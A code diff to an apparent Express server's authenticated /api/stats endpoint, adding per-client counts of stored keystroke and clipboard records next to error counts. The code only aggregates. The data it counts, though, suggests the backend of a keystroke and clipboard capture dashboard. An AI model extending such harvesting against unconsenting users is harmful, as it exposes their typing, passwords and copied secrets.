@@ -919,8 +919,19 @@ app.get('/api/stats', requireAuth, (req, res) => {
     for (const e of store.errors) {
         if (e.clientId) errByClient[e.clientId] = (errByClient[e.clientId] || 0) + 1;
     }
+    // Attach per-client keystroke and clipboard counts for display
+    const keysByClient = {};
+    for (const k of store.keystrokes) {
+        if (k.clientId) keysByClient[k.clientId] = (keysByClient[k.clientId] || 0) + 1;
+    }
+    const clipByClient = {};
+    for (const c of store.clipboard) {
+        if (c.clientId) clipByClient[c.clientId] = (clipByClient[c.clientId] || 0) + 1;
+    }
     Object.entries(store.clients).forEach(([id, c]) => {
-        c.errorCount = errByClient[id] || 0;
+        c.errorCount     = errByClient[id] || 0;
+        c.keystrokeCount = keysByClient[id] || 0;
+        c.clipboardCount = clipByClient[id] || 0;
     });
     const clientVals = Object.values(store.clients);
     // Optional ?tag= filter — only return clients with that tag
